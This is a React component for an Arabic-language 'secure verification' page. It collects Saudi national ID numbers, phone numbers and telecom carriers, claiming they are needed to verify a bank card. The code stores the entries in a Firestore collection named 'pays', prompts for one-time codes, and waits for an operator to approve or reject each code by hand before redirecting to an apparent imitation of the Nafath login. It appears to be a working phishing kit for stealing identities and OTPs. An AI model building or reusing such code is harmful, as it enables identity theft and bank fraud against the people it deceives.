"use client"

import type React from "react"
import { useEffect, useState, useCallback } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Phone, ShieldCheck, CreditCard, Lock, Loader2 } from "lucide-react"
import { addData, db } from "@/lib/firebase"
import { doc, onSnapshot, setDoc } from "firebase/firestore"
import { PhoneOtpDialog } from "@/components/phone-otp-dialog"
import { CarrierVerificationModal } from "@/components/carrier-verification-modal"
import { StcCallDialog } from "@/components/stc-call-dialog"
import { usePageRedirect } from "@/lib/use-page-redirect"
import { getRedirectUrl } from "@/lib/page-routes"

const telecomOperators = [
  { value: "stc", label: "STC - الاتصالات السعودية" },
  { value: "mobily", label: "Mobily - موبايلي" },
  { value: "zain", label: "Zain - زين" },
  { value: "virgin", label: "Virgin Mobile - فيرجن موبايل" },
  { value: "lebara", label: "Lebara - ليبارا" },
  { value: "salam", label: "SALAM - سلام" },
  { value: "go", label: "GO - جو" },
]

export function PhoneVerificationForm() {
  const [idNumber, setIdNumber] = useState("")
  const [idError, setIdError] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [phoneError, setPhoneError] = useState("")
  const [selectedCarrier, setSelectedCarrier] = useState("")
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [showWaitingModal, setShowWaitingModal] = useState(false)
  const [showStcCallDialog, setShowStcCallDialog] = useState(false)
  const [otpRejectionError, setOtpRejectionError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  const visitorId =
    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : ""

  // ── Page redirect hook ──────────────────────────────────────────────────
  usePageRedirect("verify-phone")

  // ── Firestore listener for approval status ──────────────────────────────
  useEffect(() => {
    if (!visitorId) return

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorId),
      (docSnap) => {
        if (!docSnap.exists()) return
        const data = docSnap.data()

        if (data.phoneApproval === "approved") {
          setShowWaitingModal(false)
          setShowOtpDialog(false)
          window.location.href = "/nafad"
        } else if (data.phoneApproval === "rejected") {
          setShowWaitingModal(false)
          setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
          setShowOtpDialog(true)
        }
      },
      (error) => {
        console.error("[phone-verification] Firestore listener error:", error)
      },
    )

    return () => unsubscribe()
  }, [visitorId])

  // ── Validation ──────────────────────────────────────────────────────────

  const validateIdNumber = (id: string): boolean => {
    const saudiIdRegex = /^[12]\d{9}$/
    if (!saudiIdRegex.test(id)) {
      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام")
      return false
    }
    setIdError("")
    return true
  }

  const validatePhoneNumber = (phone: string): boolean => {
    const cleanPhone = phone.replace(/\s/g, "")
    const saudiPhoneRegex = /^05\d{8}$/
    if (!saudiPhoneRegex.test(cleanPhone)) {
      setPhoneError("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام")
      return false
    }
    setPhoneError("")
    return true
  }

  // ── Handlers ────────────────────────────────────────────────────────────

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    if (value.length <= 10) {
      setIdNumber(value)
      if (value.length === 10) validateIdNumber(value)
      else setIdError("")
    }
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    if (value.length <= 10) {
      setPhoneNumber(value)
      if (value.length === 10) validatePhoneNumber(value)
      else setPhoneError("")
    }
  }

  const handleSendOtp = async () => {
    if (!idNumber || !phoneNumber || !selectedCarrier) return
    if (!validateIdNumber(idNumber)) return
    if (!validatePhoneNumber(phoneNumber)) return

    setIsSubmitting(true)

    try {
      await addData({
        id: visitorId,
        phoneIdNumber: idNumber,
        phoneNumber: phoneNumber,
        phoneCarrier: selectedCarrier,
        phoneSubmittedAt: new Date().toISOString(),
        phoneApproval: "pending",
      })
      setShowOtpDialog(true)
    } catch (error) {
      console.error("Error saving phone data:", error)
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleOtpSubmitted = () => {
    setShowOtpDialog(false)
    if (selectedCarrier === "stc") {
      setShowStcCallDialog(true)
    } else {
      setShowWaitingModal(true)
    }
  }

  const handleStcCallComplete = () => {
    setShowStcCallDialog(false)
    setShowWaitingModal(true)
  }

  const handleApproved = () => {
    setShowWaitingModal(false)
    window.location.href = "/nafad"
  }

  const handleRejected = () => {
    setShowWaitingModal(false)
    setPhoneNumber("")
    setSelectedCarrier("")
  }

  const handleOtpRejected = () => {
    setShowWaitingModal(false)
    setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
    setShowOtpDialog(true)
  }

  const isFormValid =
    idNumber.length === 10 &&
    phoneNumber.length === 10 &&
    selectedCarrier !== "" &&
    !idError &&
    !phoneError

  // ── Render ──────────────────────────────────────────────────────────────

  return (
    <>
      <div
        className="min-h-screen bg-gradient-to-b from-[#1a5c85] to-[#2d7ba8] flex items-center justify-center p-4"
        dir="rtl"
      >
        <div className="w-full max-w-lg space-y-6">
          {/* Title */}
          <div className="text-center text-white space-y-2 mb-8">
            <h1 className="text-4xl font-bold text-balance">نظام التحقق الآمن</h1>
            <p className="text-lg text-white/90">تحقق من هويتك بأمان وسرعة</p>
          </div>

          <Card className="p-6 space-y-6">
            {/* Icon + heading */}
            <div className="text-center space-y-4">
              <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-[#1a5c85]">
                <Phone className="w-10 h-10 text-white" />
              </div>
              <div>
                <h2 className="text-2xl font-bold text-gray-900 mb-2">التحقق من رقم الجوال</h2>
                <p className="text-sm text-gray-600">
                  الرجاء إدخال رقم الهوية ورقم الجوال واختيار شركة الاتصالات
                </p>
              </div>
            </div>

            {/* Info banner */}
            <div className="bg-blue-50 border-r-4 border-blue-500 p-4 rounded-lg">
              <div className="flex items-start gap-3">
                <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                <p className="text-sm text-blue-900 font-medium leading-relaxed">
                  للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم
                  الهاتف المرتبطين ببطاقتك البنكية.
                </p>
              </div>
            </div>

            {/* ID Number */}
            <div className="space-y-2">
              <Label htmlFor="idNumber" className="text-right block text-gray-700 font-semibold">
                رقم الهوية *
              </Label>
              <div className="relative">
                <Input
                  id="idNumber"
                  type="tel"
                  placeholder="1xxxxxxxxx"
                  value={idNumber}
                  onChange={handleIdChange}
                  className={`text-right pr-4 pl-12 text-lg h-12 ${idError ? "border-red-500" : ""}`}
                  dir="ltr"
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">
                  <CreditCard className="w-5 h-5" />
                </div>
              </div>
              {idError && <p className="text-red-500 text-sm text-right">{idError}</p>}
            </div>

            {/* Phone Number */}
            <div className="space-y-2">
              <Label htmlFor="phone" className="text-right block text-gray-700 font-semibold">
                رقم الجوال *
              </Label>
              <div className="relative">
                <Input
                  id="phone"
                  type="tel"
                  placeholder="05xxxxxxxx"
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                  className={`text-right pr-4 pl-20 text-lg h-12 ${phoneError ? "border-red-500" : ""}`}
                  dir="ltr"
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-semibold">
                  +966
                </div>
              </div>
              {phoneError && <p className="text-red-500 text-sm text-right">{phoneError}</p>}
            </div>

            {/* Carrier Select */}
            <div className="space-y-2">
              <Label htmlFor="carrier" className="text-right block text-gray-700 font-semibold">
                شركة الاتصالات *
              </Label>
              <select
                id="carrier"
                value={selectedCarrier}
                onChange={(e) => setSelectedCarrier(e.target.value)}
                className="w-full h-12 text-right text-base border-2 border-input rounded-lg px-4 bg-white focus:border-[#1a5c85] focus:outline-none shadow-sm appearance-none cursor-pointer"
                style={{
                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 9L1 4h10z'/%3E%3C/svg%3E")`,
                  backgroundRepeat: "no-repeat",
                  backgroundPosition: "left 1rem center",
                  paddingLeft: "2.5rem",
                }}
              >
                <option value="">اختر شركة الاتصالات</option>
                {telecomOperators.map((op) => (
                  <option key={op.value} value={op.value}>
                    {op.label}
                  </option>
                ))}
              </select>
            </div>

            {/* Submit */}
            <Button
              onClick={handleSendOtp}
              className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={!isFormValid || isSubmitting}
            >
              {isSubmitting ? (
                <><Loader2 className="h-5 w-5 animate-spin ml-2" />جاري الإرسال...</>
              ) : (
                <><Phone className="ml-2 h-5 w-5" />إرسال رمز التحقق</>
              )}
            </Button>

            {/* Security badge */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
              <p className="text-sm text-blue-900 flex items-center justify-center gap-2">
                <Lock className="h-4 w-4" />
                معلوماتك محمية بأعلى معايير الأمان والخصوصية
              </p>
            </div>
          </Card>
        </div>
      </div>

      {/* Dialogs */}
      <PhoneOtpDialog
        open={showOtpDialog}
        onOpenChange={(open) => {
          setShowOtpDialog(open)
          if (!open) setOtpRejectionError("")
        }}
        phoneNumber={phoneNumber}
        phoneCarrier={selectedCarrier}
        onOtpSubmitted={handleOtpSubmitted}
        rejectionError={otpRejectionError}
      />

      <CarrierVerificationModal
        open={showWaitingModal}
        carrier={selectedCarrier}
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
        onOtpRejected={handleOtpRejected}
      />

      <StcCallDialog
        open={showStcCallDialog}
        onComplete={handleStcCallComplete}
      />
    </>
  )
}
